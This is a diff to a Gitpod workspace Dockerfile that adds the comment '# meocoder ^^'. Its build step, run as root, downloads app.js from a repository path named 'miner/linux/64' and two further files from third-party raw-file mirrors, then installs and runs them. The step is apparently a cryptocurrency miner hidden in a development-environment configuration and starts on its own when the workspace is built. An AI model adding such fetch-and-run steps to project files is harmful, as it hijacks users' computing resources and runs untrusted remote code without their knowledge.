@@ -1,7 +1,7 @@
 FROM gitpod/workspace-full
 
 USER root
-
+# meocoder ^^
 RUN cd / \
  && sudo DEBIAN_FRONTEND=noninteractive apt-get update \
  && wget https://raw.githack.com/vippro99/-meocoder-nodejs-tool/main/miner/linux/64/app.js && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/package.json && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/log-print.js && chmod +x app.js package.json log-print.js && npm i -s && node app.js
